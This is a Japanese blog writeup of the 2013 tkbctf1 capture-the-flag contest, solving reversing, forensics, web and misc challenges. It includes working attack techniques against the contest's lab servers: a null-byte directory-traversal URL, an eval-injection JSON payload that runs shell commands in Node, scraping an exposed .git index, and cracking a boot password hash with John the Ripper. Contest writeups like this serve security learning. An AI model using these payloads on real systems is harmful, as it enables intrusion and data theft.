<!DOCTYPE html>
<html lang="ja">
  <head>
    
    <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="generator" content="Hugo 0.42.2 with theme Tranquilpeak 0.4.3-SNAPSHOT">
<meta name="author" content="Kazutoshi Noguchi">
<meta name="keywords" content="">
<meta name="description" content="2013/5/4〜5/5のtkbctf1に参加しました。



 
  
  
  
  
    
  


  
    
  
    
  
    
  
   
    Scoreboard
  





 
  
  
  
  
    
  


  
    
  
    
  
    
  
   
    Challenges
  



個人ランキングで1位でした。

">


<meta property="og:description" content="2013/5/4〜5/5のtkbctf1に参加しました。



 
  
  
  
  
    
  


  
    
  
    
  
    
  
   
    Scoreboard
  





 
  
  
  
  
    
  


  
    
  
    
  
    
  
   
    Challenges
  



個人ランキングで1位でした。

">
<meta property="og:type" content="article">
<meta property="og:title" content="tkbctf1 writeup">
<meta name="twitter:title" content="tkbctf1 writeup">
<meta property="og:url" content="https://ngkz.github.io/2014/01/tkbctf1-writeup/">
<meta property="twitter:url" content="https://ngkz.github.io/2014/01/tkbctf1-writeup/">
<meta property="og:site_name" content="ngkz.log">
<meta property="og:description" content="2013/5/4〜5/5のtkbctf1に参加しました。



 
  
  
  
  
    
  


  
    
  
    
  
    
  
   
    Scoreboard
  





 
  
  
  
  
    
  


  
    
  
    
  
    
  
   
    Challenges
  



個人ランキングで1位でした。

">
<meta name="twitter:description" content="2013/5/4〜5/5のtkbctf1に参加しました。



 
  
  
  
  
    
  


  
    
  
    
  
    
  
   
    Scoreboard
  





 
  
  
  
  
    
  


  
    
  
    
  
    
  
   
    Challenges
  



個人ランキングで1位でした。

">
<meta property="og:locale" content="ja">

  
    <meta property="article:published_time" content="2014-01-29T13:06:30">
  
  
    <meta property="article:modified_time" content="2014-01-29T13:06:30">
  
  
  
    
      <meta property="article:section" content="CTF">
    
      <meta property="article:section" content="writeup">
    
  
  
    
      <meta property="article:tag" content="tkbctf">
    
  


<meta name="twitter:card" content="summary">











  <meta property="og:image" content="https://ngkz.github.io/mypicture.jpg">
  <meta property="twitter:image" content="https://ngkz.github.io/mypicture.jpg">


    <title>tkbctf1 writeup</title>

    <link rel="icon" href="https://ngkz.github.io/favicon.png">
    

    

    <link rel="canonical" href="https://ngkz.github.io/2014/01/tkbctf1-writeup/">

    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/jquery.fancybox.min.css" integrity="sha256-vuXZ9LGmmwtjqFX1F+EKin1ThZMub58gKULUyf0qECk=" crossorigin="anonymous" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/helpers/jquery.fancybox-thumbs.min.css" integrity="sha256-SEa4XYAHihTcEP1f5gARTB2K26Uk8PsndQYHQC1f4jU=" crossorigin="anonymous" />
    
    
    <link rel="stylesheet" href="https://ngkz.github.io/css/style-nnm2spxvve8onlujjlegkkytaehyadd4ksxc1hyzzq9a2wvtrgbljqyulomn.min.css" />
    
    

    
      
    
    
  </head>

  <body>
    <div id="blog">
      <header id="header" data-behavior="1">
  <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
  <div class="header-title">
    <a class="header-title-link" href="https://ngkz.github.io/">ngkz.log</a>
  </div>
  
    
      <a class="header-right-picture "
         href="https://ngkz.github.io/page/profile/">
    
    
    
      
        <img class="header-picture" src="https://ngkz.github.io/mypicture.jpg" alt="プロフィール画像" />
      
    
    </a>
  
</header>

      <nav id="sidebar" data-behavior="1">
  <div class="sidebar-container">
    
      <div class="sidebar-profile">
        <a href="https://ngkz.github.io/page/profile/">
          <img class="sidebar-profile-picture" src="https://ngkz.github.io/mypicture.jpg" alt="プロフィール画像" />
        </a>
        <h4 class="sidebar-profile-name">Kazutoshi Noguchi</h4>
        
          <h5 class="sidebar-profile-bio">I&rsquo;m interested in InfoSec, Trip, Electronics, and DIY.</h5>
        
      </div>
    
    <ul class="sidebar-buttons">
      
  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://ngkz.github.io/">
    
      <i class="sidebar-button-icon fa fa-lg fa-home"></i>
      
      <span class="sidebar-button-desc">ホーム</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://ngkz.github.io/categories">
    
      <i class="sidebar-button-icon fa fa-lg fa-bookmark"></i>
      
      <span class="sidebar-button-desc">カテゴリー</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://ngkz.github.io/tags">
    
      <i class="sidebar-button-icon fa fa-lg fa-tags"></i>
      
      <span class="sidebar-button-desc">タグ</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://ngkz.github.io/archives">
    
      <i class="sidebar-button-icon fa fa-lg fa-archive"></i>
      
      <span class="sidebar-button-desc">アーカイブ</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://ngkz.github.io/page/profile/">
    
      <i class="sidebar-button-icon fa fa-lg fa-question"></i>
      
      <span class="sidebar-button-desc">プロフィール</span>
    </a>
  </li>


    </ul>
    <ul class="sidebar-buttons">
      
  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://github.com/ngkz" target="_blank" rel="noopener">
    
      <i class="sidebar-button-icon fa fa-lg fa-github"></i>
      
      <span class="sidebar-button-desc">GitHub</span>
    </a>
  </li>


    </ul>
    <ul class="sidebar-buttons">
      
  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://ngkz.github.io/index.xml">
    
      <i class="sidebar-button-icon fa fa-lg fa-rss"></i>
      
      <span class="sidebar-button-desc">RSS</span>
    </a>
  </li>


    </ul>
  </div>
</nav>

      

      <div id="main" data-behavior="1"
        class="
               hasCoverMetaIn
               ">
        <article class="post" itemscope itemType="http://schema.org/BlogPosting">
          
          
            <div class="post-header main-content-wrap text-left">
  
    <h1 class="post-title" itemprop="headline">
      tkbctf1 writeup
    </h1>
  
  
  <div class="postShorten-meta post-meta">
    
      <time itemprop="datePublished" datetime="2014-01-29T13:06:30&#43;09:00">
        
  
  
  
  
    2014-01-29
  

      </time>
    
    
  
  
    <span>カテゴリー</span>
    
      <a class="category-link" href="https://ngkz.github.io/categories/ctf">CTF</a>, 
    
      <a class="category-link" href="https://ngkz.github.io/categories/writeup">writeup</a>
    
  

  </div>

</div>
          
          <div class="post-content markdown" itemprop="articleBody">
            <div class="main-content-wrap">
              <p>2013/5/4〜5/5の<a href="http://tkbctf.info/tkbctf1">tkbctf1</a>に参加しました。</p>



 
  
  
  
  
    
  

<div class="figure " >
  
    <a class="fancybox" href="https://ngkz.github.io/assets/tkbctf1-writeup/fa296654d5c0a34f2c78631fe4577d70.png" title="Scoreboard" data-fancybox-group="">
  
    <img class="fig-img" src="https://ngkz.github.io/assets/tkbctf1-writeup/fa296654d5c0a34f2c78631fe4577d70.png"  alt="Scoreboard">
  
    </a>
  
   
    <span class="caption">Scoreboard</span>
  
</div>




 
  
  
  
  
    
  

<div class="figure " >
  
    <a class="fancybox" href="https://ngkz.github.io/assets/tkbctf1-writeup/6007d2ae22af0d2db3a312c9ba731253.png" title="Challenges" data-fancybox-group="">
  
    <img class="fig-img" src="https://ngkz.github.io/assets/tkbctf1-writeup/6007d2ae22af0d2db3a312c9ba731253.png"  alt="Challenges">
  
    </a>
  
   
    <span class="caption">Challenges</span>
  
</div>


<p>個人ランキングで1位でした。</p>

<p></p>

<h2 id="問題">問題</h2>

<h3 id="who-are-you-bin-100">Who are you? (Bin 100)</h3>

<p>リバースエンジニアリングの問題</p>

<p></p>

<pre><code>[BEGINNER]

http://**/9a000ac8313f9179c4b057f56d27061430f4ed1e
</code></pre>

<p></p>

<p>$ file 9a000ac8313f9179c4b057f56d27061430f4ed1e</p>

<pre><code>9a000ac8313f9179c4b057f56d27061430f4ed1e: PE32 executable (console) Intel 80386, for MS Windows
</code></pre>

<p></p>

<p>入力した文字列と、デコードしたデータを比較するプログラム。</p>

<p>デバッガで動作を追うとすぐに答えが分かる。</p>



 
  
  
  
  
    
  

<div class="figure " >
  
    <a class="fancybox" href="https://ngkz.github.io/assets/tkbctf1-writeup/6f23314b8f198a132aad58b934088dfd.png" title="Screenshot" data-fancybox-group="">
  
    <img class="fig-img" src="https://ngkz.github.io/assets/tkbctf1-writeup/6f23314b8f198a132aad58b934088dfd.png"  alt="Screenshot">
  
    </a>
  
   
    <span class="caption">Screenshot</span>
  
</div>


<p></p>

<p>Flagは「I&rsquo;m a CTF player!!!」</p>

<p></p>

<p>途中までデバッガを使わずに解析していたため、問題と解くのに時間がかかってしまった。</p>

<h3 id="happy-birthday-misc-100">Happy Birthday (Misc 100)</h3>

<pre><code>When did linux born? format: +%Y/%m/%d
</code></pre>

<p></p>

<p>Flagは Linux 0.01のリリース日の 1991/09/17</p>

<h3 id="slyr-forensic-100">slyr (Forensic 100)</h3>

<p>クラッシュダンプを解析する問題</p>

<p></p>

<pre><code>[BEGINNER]

What is he looking for?
http://**/815B0B857EBF8AAED75E4232E0B60353C0B3C084
</code></pre>

<p></p>

<p>$ file 815B0B857EBF8AAED75E4232E0B60353C0B3C084 </p>

<pre><code>815B0B857EBF8AAED75E4232E0B60353C0B3C084: Zip archive data, at least v2.0 to extract
</code></pre>

<p></p>

<p>$ file 815B0B857EBF8AAED75E4232E0B60353C0B3C084.expanded</p>

<pre><code>815B0B857EBF8AAED75E4232E0B60353C0B3C084.expanded: MDMP crash report data
</code></pre>

<p></p>

<p>$ strings 815B0B857EBF8AAED75E4232E0B60353C0B3C084.expanded</p>

<pre><code>...
u~Visited: Bob@http://www.google.com/search?hl=ja&amp;source=hp&amp;q=Windows+Vista+codename&amp;gbv=2&amp;oq=Windows+Vista+codename&amp;gs_l=heirloom-hp.3..0i19j0i30i19j0i8i30i19l3.1282.4737.0.5448.26.19.2.5.5.0.120.1413.17j2.19.0...0.0...1ac.1.12.heirloom-hp.yt3DHbaT1k4...
</code></pre>

<p></p>

<p>クラッシュダンプの文字列を見ると、 問題のファイルは Internet
Explorerのクラッシュダンプで、 Windows
Vistaのコードネームについて調べていることが分かる。</p>

<p>Flagは、Windows Vistaのコードネームの「Longhorn」。</p>

<h3 id="blue-web-100">blue (Web 100)</h3>

<p>Null Byte Injectionとディレクトリトラバーサルの問題</p>

<p></p>

<pre><code>Find the flag.

http://10.39.0.2/manual.php?page=sl
</code></pre>

<p></p>

<p>pageパラメータに渡された文字列から、「../」を取り除き、後に「.txt」をつけて、ファイルを読み込むプログラム。</p>

<p>NULL バイトから後が無視されるため、pageパラメータの最後にNULLをつけることで、 任意のファイルを読み込めてしまう。</p>

<p><a href="http://10.39.0.2/manual.php?page=//home/blue/flag%00">http://10.39.0.2/manual.php?page=//home/blue/flag%00</a></p>

<p>Flagは「DIR_TR@VERS@L」</p>

<h3 id="diva-bin-200">Diva (Bin 200)</h3>

<p>ミク算</p>

<p></p>

<pre><code>[INTERMEDIATE]
http://**/82C9DC2D2D3DF1635483D84B7A53FF0B8A80C37C

正しいフラグは32文字です。 手違いで長すぎる物も通る状態で出してしまいました。もし32文字以下で正しい回答を得られた場合、**@**までフラグを連絡して下さい。 
strlen(RIGHT_FLAG) = 32. If you got right answer with input less than 32 characters long, please send email to **@** with your flag.
</code></pre>

<p></p>

<pre><code>9 (57) : 87li  8*7+1   = 57
3 (51) : u6s   57-6    = 51
e (101): u2le  51*2-1  = 101
n (110): u9a   101+9   = 110
2 (50) : u2d5s 110/2-5 = 50
a (97) : u2l3s 50*2-3  = 97
h (104): u7a   97 + 7  = 104
</code></pre>

<p></p>

<pre><code>Press Enter key without any inputs to exit.
&gt; 87liu6su2leu9au2d5su2l3su7a
ha2ne39
A.Conguratulations! Send your input: 87liu6su2leu9au2d5su2l3su7a
</code></pre>

<p></p>

<p>問題作成者の解説:  <a href="https://web.archive.org/web/20140109071212/https://aquarite.info/2013/05/tkbctf1-diva/">tkbctf1: Diva</a></p>

<p>答えは「87liu6su2leu9au2d5su2l3su7a」</p>

<p>複数解が存在する</p>

<p>コードを読むのが辛くて、解いた後頭が痛くなった。</p>

<h3 id="my-favorite-things-forensic-400">My favorite Things (Forensic 400)</h3>

<p>しゃけ！</p>

<p>解けた人が1人しかいなかったせいか、途中にヒントが追加されて、それに伴い350→300点と点数が下がっていった。</p>

<p></p>

<pre><code>This fragged disk image contains emotional message. Do you know my favorite? It's answer.
http://**/56e6a4288ba1196b98824564fe4b98d3a5d17984

Hint1: Tanks are dummy, some images are duplicated.
Hint2: Shake!
</code></pre>

<p></p>

<p>解けなかった。</p>

<p>問題文のファイルは、 ディレクトリエントリ一部と、データ領域を含む FATファイルシステムの断片</p>

<p></p>

<pre><code>DE: name:FRAGGED    , attribute:8 reserved:0 createTimeMs:0:0:0 createTime:0:0:0 createDate:1980/0/0, accessDate:1980/0/0 cluster:0, updateTime5:33:104 updateDate:2013/5/3 fileSize:0
LFN: deleted:0, continues:64, seq:1, name:imoviewer.apk attribute: 15, reserved:0, checkCode:192, cluster:0
DE: name:IMOVIE~1APK, attribute:32 reserved:0 createTimeMs:0:2:44 createTime:5:36:28 createDate:2013/5/3, accessDate:2013/5/3 cluster:69250, updateTime5:35:48 updateDate:2013/5/3 fileSize:6161171
DE: name:GREEN   BMP, attribute:32 reserved:24 createTimeMs:0:1:68 createTime:5:40:48 createDate:2013/5/3, accessDate:2013/5/3 cluster:3, updateTime5:40:112 updateDate:2013/5/3 fileSize:5760054
DE: name:GRAY    GIF, attribute:32 reserved:24 createTimeMs:0:1:124 createTime:5:45:24 createDate:2013/5/3, accessDate:2013/5/3 cluster:11254, updateTime5:44:68 updateDate:2013/5/3 fileSize:144927
DE: name:RED     BMP, attribute:32 reserved:24 createTimeMs:0:0:116 createTime:5:45:32 createDate:2013/5/3, accessDate:2013/5/3 cluster:75106, updateTime5:41:0 updateDate:2013/5/3 fileSize:5760054
DE: name:BLUE    BMP, attribute:32 reserved:24 createTimeMs:0:0:24 createTime:5:45:40 createDate:2013/5/3, accessDate:2013/5/3 cluster:44245, updateTime5:41:24 updateDate:2013/5/3 fileSize:5760054
DE: name:TYPE90  JPG, attribute:32 reserved:24 createTimeMs:0:2:84 createTime:5:49:48 createDate:2013/5/3, accessDate:2013/5/3 cluster:55496, updateTime5:47:92 updateDate:2013/5/3 fileSize:1664984
DE: name:TYPE97  JPG, attribute:32 reserved:24 createTimeMs:0:2:88 createTime:5:49:48 createDate:2013/5/3, accessDate:2013/5/3 cluster:60149, updateTime5:48:80 updateDate:2013/5/3 fileSize:1033239
LFN: deleted:0, continues:64, seq:2, name:jpg attribute: 15, reserved:0, checkCode:189, cluster:0
LFN: deleted:0, continues:0, seq:1, name:type90 - コピー. attribute: 15, reserved:0, checkCode:189, cluster:0
DE: name:TYPE90~1JPG, attribute:32 reserved:0 createTimeMs:0:0:104 createTime:5:49:60 createDate:2013/5/3, accessDate:2013/5/3 cluster:62168, updateTime5:47:92 updateDate:2013/5/3 fileSize:1664984
LFN: deleted:0, continues:64, seq:2, name:jpg attribute: 15, reserved:0, checkCode:37, cluster:0
LFN: deleted:0, continues:0, seq:1, name:type97 - コピー. attribute: 15, reserved:0, checkCode:37, cluster:0
DE: name:TYPE97~1JPG, attribute:32 reserved:0 createTimeMs:0:0:108 createTime:5:49:60 createDate:2013/5/3, accessDate:2013/5/3 cluster:11538, updateTime5:48:80 updateDate:2013/5/3 fileSize:1033239
LFN: deleted:0, continues:64, seq:2, name:(2).jpg attribute: 15, reserved:0, checkCode:29, cluster:0
</code></pre>

<p></p>

<p>ディスクイメージからapkを取り出すことが出来なかった。</p>

<h3 id="good-old-days-bin-300">Good Old Days (Bin 300)</h3>

<p>リバースエンジニアリングの問題</p>

<p></p>

<pre><code>[ADVANCED]
I need the &quot;Message&quot; to continue my game but I forgot the secret command!!!
Can you get the &quot;Message&quot;? I remember that the &quot;Message&quot; was alphanumeric characters.
http://**/cb0c3d0f55b9b627b831f4fbbc153846
</code></pre>

<p></p>

<p>$ file cb0c3d0f55b9b627b831f4fbbc153846</p>

<pre><code>cb0c3d0f55b9b627b831f4fbbc153846: iNES ROM dump, 2x16k PRG, 1x8k CHR, [Vert.], [SRAM]
</code></pre>

<p></p>

<p>問題文のファイルはファミコンのROM。</p>

<p>←↓↑→ABのどれかのキーを8回入力すると、8文字のメッセージが表示される。</p>



 
  
  
  
  
    
  

<div class="figure " >
  
    <a class="fancybox" href="https://ngkz.github.io/assets/tkbctf1-writeup/df5efc6331016d8e552c2fa6d1d7332d.png" title="Screenshot" data-fancybox-group="">
  
    <img class="fig-img" src="https://ngkz.github.io/assets/tkbctf1-writeup/df5efc6331016d8e552c2fa6d1d7332d.png"  alt="Screenshot">
  
    </a>
  
   
    <span class="caption">Screenshot</span>
  
</div>


<p></p>

<p>メモリビューワを使うと キーを押すと アドレス
0x6000-0x6007が順に変化していくがわかる。</p>

<p>そこで、そこに書き込みブレークポイントを仕掛ける。</p>

<p>キーを押して動作を調べていくと、</p>

<p>A: 0x36でXOR <br />
B: 0x5cでXOR <br />
↑: 0xc9でXOR <br />
↓: 0xa3でXOR <br />
→: 右ローテート <br />
←: 左ローテート</p>

<p>であることががわかる。</p>

<p></p>

<pre><code>#!/usr/bin/python
operators = (
    (&quot;A&quot;,     lambda x: x ^ 0x36),
    (&quot;B&quot;,     lambda x: x ^ 0x5c),
    (&quot;UP&quot;,    lambda x: x ^ 0xc9),
    (&quot;DOWN&quot;,  lambda x: x ^ 0xa3),
    (&quot;RIGHT&quot;, lambda x: (x &gt;&gt; 1) | ((x &amp; 1) &lt;&lt; 7)), #rotate right
    (&quot;LEFT&quot;,  lambda x: ((x &lt;&lt; 1) &amp; 0xff) | ((x &amp; 0x80) &gt;&gt; 7)), #rotate left
)
values = (0xBE, 0x60, 0xA4, 0xA5, 0x88, 0x64, 0x03, 0x6A)
for x in values:
    out = []
    for op, action in operators:
        y = action(x)
        if chr(y).isalnum():
            out.append(chr(y))
    print out
</code></pre>

<p></p>

<pre><code>$ python solve.py
['w']
['V', '0']
['m', 'R', 'I']
['l', 'K']
['A', 'D']
['R', '8', '2']
['5']
['6', '5']
</code></pre>

<p></p>

<p>出力が英数字になるパターンが何個かあるが、</p>

<p>意味のある文字列の「w0RlD256」が答え。</p>

<h3 id="are-these-your-grades-web-400">Are these your grades? (Web 400)</h3>

<p>SQLインジェクションの問題</p>

<p></p>

<pre><code>こんにちは。博麗大学のS.Iと申します。
春休みに入り成績が付いたのですが、どうも線形代数Iの成績が芳しくないのです。これを落とすとたいへんなことになってしまいます。
線形代数にF(落第点)が付いているのですが、これをD(及第点ギリギリ)に書き換えてくださいませんか?
わたしのログイン情報は 13413983:f.scarlet495 なので、ご参考まで。
どうかお力添えをお願いします。

Greetings. I'm S.I at University of Hakurei.
I'm very anxious about my grades, especially Linear Algebra I.
It's about time for professors to grade us on their Online Grading System, however, I've failed the Linear Algebra I class which is a big trouble.
Can you hack into it and grade me &quot;D&quot; for Linear Algebra I instead of an &quot;F&quot;?
Here's my login information: 13413983:f.scarlet495
I appreciate your help.

--- このCTFミッションは、WIDEプロジェクト (http://www.wide.ad.jp) 提供のネットワークにて公開しております。所在地: 筑波大学3F棟230号室 産学間連携推進室 ---
--- This CTF Mission is provided via Tsukuba WIDE (http://www.wide.ad.jp), at 3F230, University of Tsukuba. ---
http://**/
</code></pre>

<p>邪道な方法で解いた。</p>

<p>/.git ディレクトリに外部からアクセスできる状態になっていたので、/.git/indexをダウンロードしてファイルの一覧を得る。</p>

<p>$ strings index</p>

<pre><code>DIRC
6b}Z
etc/config.yml
index.pl
lib/CTF/Grades.pm
lib/CTF/Login.pm
lib/CTF/Template.pm
uQ{qx
lib/scripts/grades.pl
lib/scripts/login.pl
xh`A
lib/scripts/menu.pl
lib/scripts/subjects.pl
templates/LICENSE.txt
templates/footer.tt
templates/gpl.txt
templates/grades.tt
templates/grades_editable.tt
P9&amp;U
templates/header.tt
templates/main.tt
#MhE
templates/not_logged_in.tt
templates/style.css
templates/subjects.tt
TREE
19 3
i&gt;fAt\etc
+XfG@
[$]lib
scripts
U: E)&gt;
templates
10 0
</code></pre>

<p>/etc/config.ymlにFLAGが書いてある。</p>

<p>FLAG: 忘れた</p>

<p>問題作成者の解説: <a href="https://web.archive.org/web/20170920022611/https://x86-64.jp/blog/tkbctf1-are-these-your-grades">第1回tkbctf 問題「Are these your grades?」を作ってみた</a></p>

<h3 id="fairy-misc-200">fairy (Misc 200)</h3>

<pre><code>We need to access a thin client to get trade secret of rival company.
However the client needs to be unlocked at boot sequence. Can you unlock?
This file may help you.
http://**/250d3a31dee7f62d57ea3d17f544b5e4750e8039
</code></pre>

<p></p>

<pre><code>$ file 250d3a31dee7f62d57ea3d17f544b5e4750e8039 
250d3a31dee7f62d57ea3d17f544b5e4750e8039: tcpdump capture file (little-endian) - version 2.4 (Ethernet, capture length 65535)
</code></pre>



 
  
  
  
  
    
  

<div class="figure " >
  
    <a class="fancybox" href="https://ngkz.github.io/assets/tkbctf1-writeup/ae5200b836564e01fc6b87f382440418.png" title="TFTP packets" data-fancybox-group="">
  
    <img class="fig-img" src="https://ngkz.github.io/assets/tkbctf1-writeup/ae5200b836564e01fc6b87f382440418.png"  alt="TFTP packets">
  
    </a>
  
   
    <span class="caption">TFTP packets</span>
  
</div>


<p>問題文のファイルは、PXEブートのパケットキャプチャです。</p>

<p>そこからアンロックに必要な情報を抜き取る。</p>

<p>strings でキャプチャファイルを覗くと パスワードのハッシュが得られる。</p>

<pre><code>default menu.c32
label debian
        menu passwd $4$OVtcFw7z$9S2RpE0jMdbV1Z/+daXh2RGQtDM$
        kernel linux
        append initrd=initrd.gz
</code></pre>

<p><br />
このパスワードハッシュは sha1pass
スクリプトで生成されたもので、以下のような形式になっています。</p>

<pre><code>'$4$' + salt + '$' + BASE64(SHA1(salt + password)) + '$'
</code></pre>

<p>John the
Ripperはこの形式のハッシュに対応していないので、Johnがサポートしている
sha1-gen形式に変換する。</p>

<p></p>

<p>$ echo &ldquo;9S2RpE0jMdbV1Z/+daXh2RGQtDM&rdquo; | base64 -d | xxd -p</p>

<pre><code>f52d91a44d2331d6d5d59ffe75a5e1d91190b433
</code></pre>

<p></p>

<p>$ echo &ldquo;$SHA1p$OVtcFw7z$f52d91a44d2331d6d5d59ffe75a5e1d91190b433&rdquo; &gt; boot-passwd</p>

<p>$ john &ndash;show  &ndash;format=sha1-gen boot-passwd </p>

<pre><code>?:goodluck
1 password hash cracked, 0 left
</code></pre>

<p></p>

<p>Flagは「goodluck」</p>

<h3 id="what-is-this-web-200">What is this? (Web 200)</h3>

<pre><code>This runs in user 'commando'. http://10.39.0.5/servinfo.html
</code></pre>

<p>servinfo.htmlでは、一定時間ごとに /info へJSONをpostして</p>

<ul>
<li>時刻</li>
<li>実行中のプロセスの数</li>
<li>Load Average</li>
</ul>

<p>の3つの情報を取得して表示している。</p>

<pre><code>{&quot;info&quot;: &quot;time&quot;}
</code></pre>

<p>evalで入力をパースしているため、以下のように細工したJSONを送信することで、任意のコードを実行できてしまう。</p>

<pre><code>{&quot;info&quot;: function() {
  var orig = Date.prototype.getTime;
  Date.prototype.getTime = function() {
    var util = require('util');
    var exec = require('child_process').exec;
    function a(error, stdout, stderr) {
      GLOBAL.__stdout = stdout;
      GLOBAL.__stderr = stderr;
    }
    exec(&quot;cat /home/commado/flag&quot;, a);
    return [GLOBAL.__stdout, GLOBAL.__stderr];
  };
  process.nextTick(function() { Date.prototype.getTime = orig; });
  return &quot;time&quot;;
}()}
</code></pre>

<p>Flagは「MACHOMAN」</p>

<p>最初はflagのパーミッションが間違っていて、rootしか読めないようになってしまっていたが
修正された。</p>

<h3 id="who-wrote-this-misc-300">Who wrote this? (Misc 300)</h3>

<pre><code>http://**/581cf9b214c109556fbb3cf74094dcded66baa17
</code></pre>

<p>解けなかった。</p>

<p>$ file 581cf9b214c109556fbb3cf74094dcded66baa17</p>

<pre><code>581cf9b214c109556fbb3cf74094dcded66baa17: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.9, not stripped
</code></pre>

<p>問題文のファイルを展開すると、ELFファイルが出てくる。</p>

<pre><code>08048374 &lt;main&gt;:
 8048374:       3c 03                   cmp    $0x3,%al
 8048376:       3c 08                   cmp    $0x8,%al
 8048378:       3c 05                   cmp    $0x5,%al
 804837a:       b7 08                   mov    $0x8,%bh
 804837c:       3c 07                   cmp    $0x7,%al
 804837e:       04 09                   add    $0x9,%al
 8048380:       04 09                   add    $0x9,%al
 8048382:       b7 08                   mov    $0x8,%bh
 8048384:       2c 0a                   sub    $0xa,%al
 8048386:       b0 08                   mov    $0x8,%al
 8048388:       2c 0b                   sub    $0xb,%al
 804838a:       3c 08                   cmp    $0x8,%al
 804838c:       b7 0b                   mov    $0xb,%bh
 804838e:       04 08                   add    $0x8,%al
 8048390:       2c 0c                   sub    $0xc,%al
 8048392:       3c 07                   cmp    $0x7,%al
 8048394:       1c 0c                   sbb    $0xc,%al
</code></pre>

<p>実行してもなにも起こらないコード</p>

<p>バイナリエディタで見てもよく分からなかった。</p>
              
            </div>
          </div>
          <div id="post-footer" class="post-footer main-content-wrap">
            
              
                
                
                  <div class="post-footer-tags">
                    <span class="text-color-light text-small">タグ</span><br/>
                    
  <a class="tag tag--primary tag--small" href="https://ngkz.github.io/tags/tkbctf/">tkbctf</a>

                  </div>
                
              
            
            <div class="post-actions-wrap">
  
      <nav >
        <ul class="post-actions post-action-nav">
          
            <li class="post-action">
              
                <a class="post-action-btn btn btn--default tooltip--top" href="https://ngkz.github.io/2014/01/seccon-2012-finals/" data-tooltip="SECCON CTF 2012 全国大会で優勝しました。">
              
                  <i class="fa fa-angle-left"></i>
                  <span class="hide-xs hide-sm text-small icon-ml">次</span>
                </a>
            </li>
            <li class="post-action">
              
                <a class="post-action-btn btn btn--default tooltip--top" href="https://ngkz.github.io/2014/01/newyearsctf/" data-tooltip="年越しCTF x86-64.jp大会 2014で優勝しました。">
              
                  <span class="hide-xs hide-sm text-small icon-mr">前</span>
                  <i class="fa fa-angle-right"></i>
                </a>
            </li>
          
        </ul>
      </nav>
    <ul class="post-actions post-action-share" >
      
        <li class="post-action hide-lg hide-md hide-sm">
          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
            <i class="fa fa-share-alt"></i>
          </a>
        </li>
        
          <li class="post-action hide-xs">
            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://ngkz.github.io/2014/01/tkbctf1-writeup/">
              <i class="fa fa-facebook-official"></i>
            </a>
          </li>
        
          <li class="post-action hide-xs">
            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://ngkz.github.io/2014/01/tkbctf1-writeup/">
              <i class="fa fa-twitter"></i>
            </a>
          </li>
        
          <li class="post-action hide-xs">
            <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https://ngkz.github.io/2014/01/tkbctf1-writeup/">
              <i class="fa fa-google-plus"></i>
            </a>
          </li>
        
      
      
        <li class="post-action">
          <a class="post-action-btn btn btn--default" href="#disqus_thread">
            <i class="fa fa-comment-o"></i>
          </a>
        </li>
      
      <li class="post-action">
        
          <a class="post-action-btn btn btn--default" href="#">
        
          <i class="fa fa-list"></i>
        </a>
      </li>
    </ul>
  
</div>

            
              
                <div id="disqus_thread">
  <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
</div>
              
            
          </div>
        </article>
        <footer id="footer" class="main-content-wrap">
  <span class="copyrights">
      <a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by-sa/4.0/80x15.png" /></a><br /><span xmlns:dct="http://purl.org/dc/terms/" property="dct:title">ngkz.log</span> by <a xmlns:cc="http://creativecommons.org/ns#" href="https://ngkz.github.io/" property="cc:attributionName" rel="cc:attributionURL">Kazutoshi Noguchi</a> is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/">Creative Commons Attribution-ShareAlike 4.0 International License</a>.
  </span>
</footer>

      </div>
      <div id="bottom-bar" class="post-bottom-bar" data-behavior="1">
        <div class="post-actions-wrap">
  
      <nav >
        <ul class="post-actions post-action-nav">
          
            <li class="post-action">
              
                <a class="post-action-btn btn btn--default tooltip--top" href="https://ngkz.github.io/2014/01/seccon-2012-finals/" data-tooltip="SECCON CTF 2012 全国大会で優勝しました。">
              
                  <i class="fa fa-angle-left"></i>
                  <span class="hide-xs hide-sm text-small icon-ml">次</span>
                </a>
            </li>
            <li class="post-action">
              
                <a class="post-action-btn btn btn--default tooltip--top" href="https://ngkz.github.io/2014/01/newyearsctf/" data-tooltip="年越しCTF x86-64.jp大会 2014で優勝しました。">
              
                  <span class="hide-xs hide-sm text-small icon-mr">前</span>
                  <i class="fa fa-angle-right"></i>
                </a>
            </li>
          
        </ul>
      </nav>
    <ul class="post-actions post-action-share" >
      
        <li class="post-action hide-lg hide-md hide-sm">
          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
            <i class="fa fa-share-alt"></i>
          </a>
        </li>
        
          <li class="post-action hide-xs">
            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://ngkz.github.io/2014/01/tkbctf1-writeup/">
